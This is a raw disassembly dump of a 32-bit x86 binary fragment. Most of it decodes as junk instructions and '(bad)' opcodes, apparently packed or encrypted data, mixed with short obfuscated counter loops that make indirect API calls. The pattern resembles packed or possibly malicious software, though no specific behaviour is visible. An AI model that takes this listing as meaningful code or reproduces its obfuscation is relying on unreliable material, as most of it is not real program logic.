  407403:	jne    0x4073c3
  407405:	int    0x43
  407407:	mov    ecx,0xf15547dc
  40740c:	xchg   ecx,eax
  40740d:	dec    eax
  40740e:	in     eax,0x9
  407410:	(bad)  
  407412:	test   eax,0x1503ac93
  407417:	pop    ecx
  407418:	push   es
  407419:	xchg   edi,eax
  40741a:	inc    edi
  40741b:	sti    
  40741c:	jne    0x4073fd
  40741e:	test   al,0xfb
  407420:	arpl   ax,si
  407422:	push   eax
  407423:	mov    al,ds:0xe1f35f33
  407428:	pop    esi
  407429:	and    BYTE PTR [edi],al
  40742b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40742c:	push   es
  40742d:	add    DWORD PTR [ecx-0x1061c20a],0x60
  407434:	jnp    0x4073d7
  407436:	in     al,dx
  407437:	inc    eax
  407438:	jge    0x4074a2
  40743a:	ret    0x2536
  40743d:	imul   edi,DWORD PTR [eax-0x2f],0xffffffae
  407441:	xor    al,0x2d
  407443:	mov    esp,0x48c0deeb
  407448:	mul    ah
  40744a:	inc    esi
  40744b:	or     BYTE PTR [edi+0x72924bfd],0xea
  407452:	addr16 xor dl,dl
  407455:	mov    ds:0x2b0a0f84,eax
  40745a:	xchg   esi,eax
  40745b:	or     ch,BYTE PTR [edx+0x13aa0f74]
  407461:	push   es
  407462:	and    eax,0xe87a58c5
  407467:	jl     0x407499
  407469:	sub    edx,DWORD PTR [esi+0x43]
  40746c:	ins    DWORD PTR es:[edi],dx
  40746d:	iret   
  40746e:	sbb    eax,DWORD PTR [edx]
  407470:	xchg   esp,eax
  407471:	sub    bh,BYTE PTR [ebx+0x48]
  407474:	pop    ecx
  407475:	mov    DWORD PTR [ecx+ecx*8+0xbc142d1],ebp
  40747c:	xchg   DWORD PTR [eax-0xc],edx
  40747f:	das    
  407480:	inc    esp
  407481:	xchg   ebx,eax
  407482:	jo     0x407404
  407484:	jnp    0x40745f
  407486:	xor    eax,0xa6052ca5
  40748b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40748c:	out    dx,eax
  40748d:	jae    0x407429
  40748f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407490:	iret   
  407491:	jns    0x4074b0
  407493:	mov    al,ds:0xf74f8c7b
  407498:	sub    BYTE PTR [edx],0xf2
  40749b:	mov    bh,0x72
  40749d:	lahf   
  40749e:	dec    eax
  40749f:	mov    ebp,0x86ca1b22
  4074a4:	cdq    
  4074a5:	(bad)
  4074a9:	jmp    0x550:0xf127af80
  4074b0:	retf   0xd2c8
  4074b3:	or     eax,0x7f8a7884
  4074b8:	push   0x5d
  4074ba:	adc    edx,esi
  4074bc:	and    eax,0x4c6c188a
  4074c1:	in     eax,dx
  4074c2:	pop    ss
  4074c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c4:	jle    0x4074ee
  4074c6:	ret    
  4074c7:	or     eax,0x2520257d
  4074cc:	(bad)  
  4074cd:	pop    ecx
  4074ce:	leave  
  4074cf:	popf   
  4074d0:	adc    BYTE PTR [edi-0x2460158e],0xc8
  4074d7:	sub    ch,dh
  4074d9:	xchg   esp,eax
  4074da:	dec    edx
  4074db:	jmp    0xc53f:0x3dbce1ef
  4074e2:	(bad)  
  4074e4:	bound  esp,QWORD PTR [esi]
  4074e6:	push   0x43
  4074e8:	ja     0x407491
  4074ea:	xchg   ah,bh
  4074ec:	push   cs
  4074ed:	sub    al,BYTE PTR ds:0x82a59226
  4074f3:	xor    DWORD PTR [ebx-0x55],ecx
  4074f6:	ret    0x5fcd
  4074f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074fa:	test   eax,0x203678e7
  4074ff:	addr16 or al,0x83
  407502:	and    DWORD PTR [eax+eiz*4],esi
  407505:	mov    edx,DWORD PTR [ecx+ecx*4-0x2e7c1321]
  40750c:	or     ah,BYTE PTR [esi-0x273482bb]
  407512:	sbb    DWORD PTR [ecx-0x151af586],ebx
  407518:	fisubr DWORD PTR [ecx-0x1c]
  40751b:	shl    BYTE PTR [ebx],cl
  40751d:	mov    ecx,0xf3a42ecf
  407522:	inc    edi
  407523:	cmp    BYTE PTR [esi],0x5d
  407526:	ss fmul st(2),st
  407529:	enter  0x2744,0x45
  40752d:	inc    ebx
  40752e:	mov    edi,0x90aec20f
  407533:	sub    eax,0xf3972f58
  407538:	dec    edx
  407539:	inc    ebp
  40753a:	test   BYTE PTR [ebx+0x5c410ae6],0x7d
  407541:	outs   dx,DWORD PTR ds:[esi]
  407542:	add    ecx,DWORD PTR [edx+edx*4]
  407545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407546:	popa   
  407547:	ja     0x4074d2
  407549:	imul   ebp,esi,0x548628d4
  40754f:	add    ah,dl
  407551:	mov    ebx,0x270f66e3
  407556:	pop    esi
  407557:	mov    ebx,0xd4b02c5b
  40755c:	fstp   DWORD PTR [ecx+0x5e]
  40755f:	js     0x4075a5
  407561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407562:	mov    dl,0xbc
  407564:	add    DWORD PTR [eax-0x55],edx
  407567:	sbb    eax,esp
  407569:	xor    BYTE PTR ds:0x71b5ff93,dh
  40756f:	mov    cl,0x4
  407571:	sbb    BYTE PTR [ebp+0x3759462d],dl
  407577:	out    0x55,eax
  407579:	push   esi
  40757a:	dec    ebp
  40757b:	inc    edx
  40757c:	jge    0x40758f
  40757e:	fidiv  WORD PTR [ecx-0x11]
  407581:	mov    esp,0x3a7c1dec
  407586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407587:	ficom  WORD PTR [ebx]
  407589:	jp     0x40759e
  40758b:	jo     0x407567
  40758d:	xchg   edi,eax
  40758e:	mov    dl,0x64
  407590:	dec    ebx
  407591:	xchg   edi,eax
  407592:	retf   
  407593:	push   ecx
  407594:	cmp    DWORD PTR [edx-0x3c4ba645],eax
  40759a:	mov    edx,0x45c757fb
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	mov    bl,0x6e
  407657:	std    
  407658:	mov    ah,0x11
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x4076c1
  407662:	pop    esp
  407663:	lahf   
  407664:	ins    BYTE PTR es:[edi],dx
  407665:	inc    ebx
  407666:	mov    BYTE PTR [ecx],ch
  407668:	lahf   
  407669:	mov    ah,0x8b
  40766b:	xor    BYTE PTR [edi+0x58663fc1],al
  407671:	retf   
  407672:	sbb    ebp,esi
  407674:	jne    0x4076a9
  407676:	jno    0x40762a
  407678:	jg     0x407639
  40767a:	jae    0x40760c
  40767c:	outs   dx,BYTE PTR ds:[esi]
  40767d:	adc    dh,BYTE PTR [eax-0x4b45754c]
  407683:	cwde   
  407684:	adc    al,0x36
  407686:	adc    eax,0x208b5760
  40768b:	(bad)  
  40768c:	std    
  40768d:	or     dh,al
  40768f:	mov    eax,ds:0x601a4c0e
  407694:	aaa    
  407695:	into   
  407696:	ins    BYTE PTR es:[edi],dx
  407697:	retf   0x61a8
  40769a:	(bad)  
  40769b:	not    BYTE PTR [ecx+0x74]
  40769e:	pop    es
  40769f:	pop    ecx
  4076a0:	cld    
  4076a1:	fbstp  TBYTE PTR [edx+0x24294a16]
  4076a7:	imul   esi,DWORD PTR [esi+0x1a],0xd1a6748c
  4076ae:	lds    ecx,FWORD PTR [esi+0x8]
  4076b1:	inc    edx
  4076b2:	clc    
  4076b3:	js     0x40768b
  4076b5:	cwde   
  4076b6:	je     0x4076e2
  4076b8:	jne    0x40771c
  4076ba:	or     eax,0x4d291436
  4076bf:	jl     0x40765c
  4076c1:	pop    edi
  4076c3:	push   ebx
  4076c4:	inc    ebp
  4076c5:	add    BYTE PTR [edi-0x49],al
  4076c8:	pcmpgtb mm3,mm7
  4076cb:	jp     0x40766e
  4076cd:	enter  0xd210,0x97
  4076d1:	out    dx,al
  4076d2:	(bad)  
  4076d3:	aam    0x45
  4076d5:	xor    eax,0xad0eea54
  4076da:	cmc    
  4076db:	add    ebx,DWORD PTR [eax+0x31cbe253]
  4076e1:	inc    ebp
  4076e2:	push   ebp
  4076e3:	push   esi
  4076e4:	sbb    esp,ebp
  4076e6:	jl     0x4076ac
  4076e8:	jae    0x4076be
  4076ea:	add    al,0xdb
  4076ec:	mov    al,0xe9
  4076ee:	mov    edx,0x6d463a1d
  4076f3:	ret    0xd544
  4076f6:	out    dx,al
  4076f7:	cld    
  4076f8:	outs   dx,BYTE PTR ds:[esi]
  4076f9:	add    DWORD PTR [edx+0x2c],ebx
  4076fc:	cmp    eax,0xbfc82d15
  407701:	xchg   esp,eax
  407702:	xchg   ebp,eax
  407703:	mov    DWORD PTR [edx+0x12],ecx
  407706:	mov    edi,DWORD PTR [esi]
  407708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407709:	test   al,0x7
  40770b:	add    esp,DWORD PTR [edi]
  40770d:	xlat   BYTE PTR ds:[ebx]
  40770e:	pop    esp
  40770f:	xchg   edi,eax
  407710:	fwait
  407711:	and    BYTE PTR gs:[eax],0x5c
  407715:	fdiv   QWORD PTR [eax-0x27ee296e]
  40771b:	or     edi,DWORD PTR [eax]
  40771d:	mov    ebp,0x6cd6075c
  407722:	cmp    al,BYTE PTR [esi+edi*8-0xe]
  407726:	adc    edx,esp
  407728:	pop    ebp
  407729:	fistp  WORD PTR [ebx]
  40772b:	scas   eax,DWORD PTR es:[edi]
  40772c:	out    0x7d,eax
  40772e:	xchg   ecx,eax
  40772f:	stc    
  407730:	jle    0x407750
  407732:	(bad)  
  407734:	imul   ecx,DWORD PTR [edi],0x6c587613
  40773a:	dec    edx
  40773b:	dec    ebx
  40773c:	jl     0x407771
  40773e:	frstor [ebp+0x4f6c3b08]
  407744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407745:	add    esp,eax
  407747:	ins    BYTE PTR es:[edi],dx
  407748:	aad    0x5e
  40774a:	shl    BYTE PTR [ebp-0x6ddf130b],0xe3
  407751:	pop    eax
  407752:	pop    ebx
  407753:	add    eax,0x75232576
  407758:	test   BYTE PTR [ebx+0x7f51100b],0xfa
  40775f:	retf   
  407760:	sbb    BYTE PTR [ebx-0x27],cl
  407763:	sub    DWORD PTR [ebx+esi*1],esp
  407766:	xchg   dl,bh
  407768:	shl    DWORD PTR [ebx-0x172b101],0xb5
  40776f:	inc    edx
  407770:	jb     0x407741
  407772:	out    0xb7,eax
  407774:	mov    gs,WORD PTR [esi-0x46]
  407777:	mov    cl,0x6e
  407779:	and    dl,BYTE PTR [ecx]
  40777b:	int    0xd1
  40777d:	lahf   
  40777e:	fcomp  QWORD PTR [ebp-0x39d77ca4]
  407784:	das    
  407785:	jle    0x4077d5
  407787:	gs or  eax,0xae62b381
  40778d:	fs int 0x58
  407790:	jns    0x407791
  407792:	(bad)  [ebp+eiz*4-0xc]
  407796:	ret    
  407797:	test   al,0x5b
  407799:	jnp    0x407767
  40779b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40779c:	leave  
  40779d:	mov    eax,0x6a43dd36
  4077a2:	and    bl,al
  4077a4:	mov    dh,0x6a
  4077a6:	dec    esi
  4077a7:	sub    DWORD PTR [ebp+edi*8-0x52],ecx
  4077ab:	mov    ebp,0x4eaa414c
  4077b0:	inc    ecx
  4077b1:	push   cs
  4077b2:	pusha  
  4077b3:	aam    0x5b
  4077b5:	xchg   ebp,eax
  4077b6:	test   BYTE PTR [esi+0x4f],bl
  4077b9:	cmp    ch,ch
  4077bb:	ficom  DWORD PTR [eax-0x2c7a293b]
  4077c1:	pop    ebx
  4077c2:	rol    DWORD PTR [edi-0x6e],1
  4077c5:	xchg   esi,eax
  4077c6:	jecxz  0x4077a6
  4077c8:	mov    ch,0xad
  4077ca:	cmc    
  4077cb:	fimul  WORD PTR [ecx-0x35]
  4077ce:	mov    esi,0x1f15014e
  4077d3:	repnz fdivr DWORD PTR [ebx]
  4077d6:	test   eax,0x60243948
  4077db:	push   ds
  4077dc:	xor    DWORD PTR [edx+0x20985db5],esi
  4077e2:	cmp    al,0xee
  4077e4:	and    cl,BYTE PTR [edx+eiz*8]
  4077e7:	scas   al,BYTE PTR es:[edi]
  4077e8:	mov    ebp,0x530b1046
  4077ed:	cmp    BYTE PTR [ebp-0x76],ch
  4077f0:	daa    
  4077f1:	and    DWORD PTR [ebx],0xffffffb4
  4077f4:	dec    ebx
  4077f5:	push   0xfa4540a3
  4077fa:	jmp    0x6888e5b7
  4077ff:	jmp    0x370:0xf71a1353
  407806:	mov    ecx,0x73fce4c
  40780b:	mov    dh,0x2b
  40780d:	sub    ah,BYTE PTR [edx-0x29e9428]
  407813:	push   edi
  407814:	(bad)  
  407816:	call   0x7271:0x24f59ae0
  40781d:	icebp  
  40781e:	jns    0x407814
  407820:	sub    BYTE PTR [ecx],cl
  407822:	sahf   
  407823:	cli    
  407824:	ins    DWORD PTR es:[edi],dx
  407825:	icebp  
  407826:	shl    BYTE PTR [ebx],0xb9
  407829:	or     al,0xae
  40782b:	push   esp
  40782c:	or     esp,DWORD PTR [ebx-0x5e5832bf]
  407832:	xchg   ecx,eax
  407833:	or     DWORD PTR [ebp-0x4e],ecx
  407836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407837:	sbb    al,0x82
  407839:	aam    0x1e
  40783b:	bound  ebx,QWORD PTR [esi]
  40783d:	xchg   BYTE PTR [ebx-0x3823886a],bl
  407843:	rol    BYTE PTR [esi],0xc2
  407846:	mov    bh,BYTE PTR [esi]
  407848:	ds hlt 
  40784a:	mov    ebp,0xa98e8214
  40784f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407850:	pop    ebp
  407851:	dec    esi
  407852:	or     DWORD PTR [eax+0x45],ebp
  407855:	pop    ecx
  407856:	inc    ecx
  407857:	xor    ebp,DWORD PTR [esi+esi*1+0x383b1756]
  40785e:	xchg   BYTE PTR [edi+0x72a64fa6],dh
  407864:	fsub   QWORD PTR [edx+0x36f7cef4]
  40786a:	cmp    al,0xf0
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x79,eax
  407922:	mov    bh,0xdc
  407924:	mov    eax,ds:0x7e7ece24
  407929:	add    eax,0x2b7e7e7c
  40792e:	push   ebp
  40792f:	or     al,0xe0
  407931:	xchg   edx,eax
  407932:	sub    edi,DWORD PTR [edi+0x4f]
  407935:	cmc    
  407936:	sbb    al,0x98
  407938:	jno    0x40798f
  40793a:	lahf   
  40793b:	xchg   ecx,eax
  40793c:	test   DWORD PTR [esi-0x49],0x7d156b94
  407943:	pop    es
  407944:	outs   dx,DWORD PTR ds:[esi]
  407945:	aas    
  407946:	daa    
  407947:	mov    ah,0x80
  407949:	pop    ebx
  40794a:	jbe    0x4079b0
  40794c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40794d:	out    0x54,al
  40794f:	mov    edx,0xa4f99e01
  407954:	inc    esi
  407955:	push   esi
  407956:	pop    ecx
  407957:	sahf   
  407958:	retf   0x8ab3
  40795b:	rep ins BYTE PTR es:[edi],dx
  40795d:	sub    edi,DWORD PTR [esi+edx*2]
  407960:	sbb    bh,BYTE PTR [ebx-0x48]
  407963:	jle    0x407906
  407965:	cmp    bl,BYTE PTR [ebx-0x51088942]
  40796b:	cwde   
  40796c:	sti    
  40796d:	inc    esp
  40796e:	mov    BYTE PTR [eax+ebx*1-0x58],dh
  407972:	and    al,al
  407974:	cmp    eax,0x5541601a
  407979:	ror    cl,0x39
  40797c:	xor    ebp,DWORD PTR [ebx-0x40980fd6]
  407982:	jbe    0x8a17ccfa
  407988:	lds    esp,FWORD PTR [ebp+0x2df15891]
  40798e:	mov    esp,0x4bd3cab6
  407993:	xchg   edx,eax
  407994:	in     al,0x23
  407996:	mov    al,ds:0x108da671
  40799b:	das    
  40799c:	test   eax,0xd4fe204c
  4079a1:	call   0x6c06fd62
  4079a6:	stc    
  4079a7:	pop    esi
  4079a8:	out    dx,al
  4079a9:	fstp   DWORD PTR [eax-0x13ef0925]
  4079af:	xchg   edi,eax
  4079b0:	sbb    ebx,ecx
  4079b2:	js     0x407943
  4079b4:	push   esp
  4079b5:	dec    edi
  4079b6:	sbb    dh,cl
  4079b8:	pop    ebx
  4079b9:	in     eax,dx
  4079ba:	out    dx,al
  4079bb:	or     al,0x51
  4079bd:	retf   0x3310
  4079c0:	test   DWORD PTR [ecx],esp
  4079c2:	pop    esi
  4079c3:	iret   
  4079c4:	je     0x4079cc
  4079c6:	and    esp,DWORD PTR [edx]
  4079c8:	cmp    al,0x45
  4079ca:	xchg   esi,eax
  4079cb:	jne    0x4079ef
  4079cd:	in     eax,0xf0
  4079cf:	adc    BYTE PTR [edi+0x3e9b0277],al
  4079d5:	int    0xb4
  4079d7:	mov    ebp,0xad0fb684
  4079dc:	lahf   
  4079dd:	retf   0xaee0
  4079e0:	out    dx,al
  4079e1:	jg     0x407994
  4079e3:	adc    eax,0xf9e63004
  4079e8:	and    edx,edi
  4079ea:	sti    
  4079eb:	xor    BYTE PTR [ebx+0x64],bh
  4079ee:	faddp  st(1),st
  4079f0:	loopne 0x407a3b
  4079f2:	push   cs
  4079f3:	mov    esp,0x9f581e
  4079f8:	inc    esi
  4079f9:	jecxz  0x4079f6
  4079fb:	xor    BYTE PTR [ebx+0x52],0x2e
  4079ff:	push   ecx
  407a00:	cmp    eax,DWORD PTR [ecx+edx*8]
  407a03:	cld    
  407a04:	ret    
  407a05:	popf   
  407a06:	xchg   ecx,eax
  407a07:	sbb    BYTE PTR [ebx-0x2a],bl
  407a0a:	cwde   
  407a0b:	jne    0x4079e8
  407a0d:	mov    al,ds:0x2a9e486e
  407a12:	sub    edx,DWORD PTR [ecx-0x24]
  407a15:	push   edx
  407a16:	jo     0x4079bf
  407a18:	(bad)
  407a1c:	push   ecx
  407a1d:	mov    ds:0x4021953f,eax
  407a22:	adc    BYTE PTR [esi+0xf],ah
  407a25:	xchg   ebx,eax
  407a26:	jg     0x407a4b
  407a28:	push   ds
  407a29:	push   es
  407a2a:	jl     0x407a5a
  407a2c:	jne    0x407a52
  407a2e:	xchg   ebp,eax
  407a2f:	stc    
  407a30:	dec    ebx
  407a31:	xor    ah,BYTE PTR ds:0x5739f581
  407a37:	stos   BYTE PTR es:[edi],al
  407a38:	loopne 0x407a95
  407a3a:	in     eax,dx
  407a3b:	test   al,0x91
  407a3d:	inc    ebp
  407a3e:	rcl    DWORD PTR [ebp-0x68c30134],0x41
  407a45:	rcr    cl,cl
  407a47:	jne    0x407a40
  407a49:	push   ebx
  407a4a:	push   ss
  407a4b:	clc    
  407a4c:	adc    BYTE PTR [ebx+edx*2+0x6db42303],ch
  407a53:	jl     0x4079f3
  407a55:	inc    ecx
  407a56:	into   
  407a57:	cld    
  407a58:	xchg   esi,eax
  407a59:	mov    ch,0x71
  407a5b:	scas   al,BYTE PTR es:[edi]
  407a5c:	dec    edx
  407a5d:	stos   BYTE PTR es:[edi],al
  407a5e:	jmp    0xd403:0xcf633a7e
  407a65:	sub    ebx,DWORD PTR [ecx]
  407a67:	adc    BYTE PTR [ecx-0x45],bl
  407a6a:	push   ebx
  407a6b:	and    DWORD PTR [edi-0x3985213b],ecx
  407a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a72:	(bad)  
  407a74:	shr    BYTE PTR [ebx+eax*4],cl
  407a77:	mov    ds:0xc65b4338,al
  407a7c:	test   BYTE PTR [edi],ch
  407a7e:	push   edx
  407a7f:	cmp    al,0x4e
  407a81:	or     al,0xc9
  407a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a84:	xor    BYTE PTR [edx+0x4bf9c3c3],cl
  407a8a:	jb     0x407b06
  407a8c:	es jae 0x407ad9
  407a8f:	cmp    eax,0x677a74f4
  407a94:	call   0xb9d479d1
  407a99:	test   al,0x2f
  407a9b:	lea    esp,[edi-0x377c083f]
  407aa1:	in     al,0x53
  407aa3:	sbb    edx,DWORD PTR ds:0x59473617
  407aa9:	push   esp
  407aaa:	sub    ecx,DWORD PTR [ebp+0x2e]
  407aad:	jle    0x407a4c
  407aaf:	scas   eax,DWORD PTR es:[edi]
  407ab0:	fwait
  407ab1:	ret    0xc426
  407ab4:	sti    
  407ab5:	clc    
  407ab6:	mov    bh,0x7e
  407ab8:	push   0x34c4a8aa
  407abd:	lods   eax,DWORD PTR ds:[esi]
  407abe:	add    bh,BYTE PTR [ebp+0x5e]
  407ac1:	add    ebp,DWORD PTR [edi]
  407ac3:	xchg   ecx,eax
  407ac4:	push   eax
  407ac5:	mov    bl,0x8e
  407ac7:	sub    DWORD PTR [edi-0x6b6c7a04],eax
  407acd:	pop    ebp
  407ace:	out    dx,eax
  407acf:	fiadd  WORD PTR ds:0xdb3a9730
  407ad5:	inc    esp
  407ad6:	neg    DWORD PTR [eax+eiz*4-0x4336350e]
  407add:	cmp    DWORD PTR [eax-0x3fce57a4],0xffffffc9
  407ae4:	lahf   
  407ae5:	hlt    
  407ae6:	jle    0x407ad1
  407ae8:	outs   dx,BYTE PTR ds:[esi]
  407ae9:	adc    DWORD PTR [edx+0x449d3311],0xffffffe7
  407af0:	(bad)  
  407af1:	lods   eax,DWORD PTR ds:[esi]
  407af2:	sahf   
  407af3:	cld    
  407af4:	xchg   ebp,eax
  407af5:	pop    esi
  407af6:	mov    dh,0x11
  407af8:	addr16 cmp al,0x66
  407afb:	gs and eax,0x5b8facee
  407b01:	test   ch,bh
  407b03:	cmc    
  407b04:	int3   
  407b05:	idiv   ecx
  407b07:	mov    edi,DWORD PTR [ebx]
  407b09:	sub    eax,0x57e6cf0c
  407b0e:	push   edx
  407b0f:	sbb    eax,0xc7b9f0eb
  407b14:	in     al,dx
  407b15:	rcl    DWORD PTR [ecx],cl
  407b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b18:	inc    edx
  407b19:	mov    al,ds:0xf0412e32
  407b1e:	ins    DWORD PTR es:[edi],dx
  407b1f:	xchg   esp,eax
  407b20:	mov    esi,0x79e4638a
  407b25:	shl    dl,0xa9
  407b28:	ror    bl,1
  407b2a:	pusha  
  407b2b:	mov    edx,0xa913bdbd
  407b30:	sub    ch,bl
  407b32:	loope  0x407b61
  407b34:	arpl   bp,dx
  407b36:	push   ss
  407b37:	in     al,0x33
  407b39:	rol    DWORD PTR [ecx+0x4336ab15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43366b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4336d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433657,0x11
  407bd9:	cmp    DWORD PTR ds:0x433657,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433657,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433657,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433657
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433657,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433657
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433657,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	pop    edi
  407c4b:	(bad)  
  407c4c:	sbb    cl,cl
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xce7e7e7c
  407c57:	data16 mov BYTE PTR [esi+0x64],al
  407c5b:	loop   0x407cda
  407c5d:	xchg   edx,eax
  407c5e:	pop    ss
  407c5f:	sti    
  407c60:	out    0xd7,eax
  407c62:	out    0x4d,al
  407c64:	sub    dl,BYTE PTR [esi+edx*2-0x1cb9824d]
  407c6b:	in     al,dx
  407c6c:	mov    esp,DWORD PTR [ecx+ebx*8]
  407c6f:	pop    edi
  407c70:	add    cl,dl
  407c72:	add    eax,0x72e503f9
  407c77:	fstp   TBYTE PTR [ebp-0x77dfcde7]
  407c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c7e:	mov    cs,WORD PTR [ebp+0x7ae429fa]
  407c84:	ss mov fs,esp
  407c87:	test   eax,0xe162c5e3
  407c8c:	inc    ecx
  407c8d:	lods   al,BYTE PTR ds:[esi]
  407c8e:	and    esp,DWORD PTR [ebp+0x77]
  407c91:	jbe    0x407c70
  407c93:	repnz xchg ecx,eax
  407c95:	scas   eax,DWORD PTR es:[edi]
  407c96:	add    BYTE PTR [esi],0x89
  407c99:	fimul  DWORD PTR [edi]
  407c9b:	sub    al,0x64
  407c9d:	jmp    0x56:0xb457ba09
  407ca4:	jbe    0x407c57
  407ca6:	adc    dl,BYTE PTR ds:0x739358dc
  407cac:	ds (bad) 
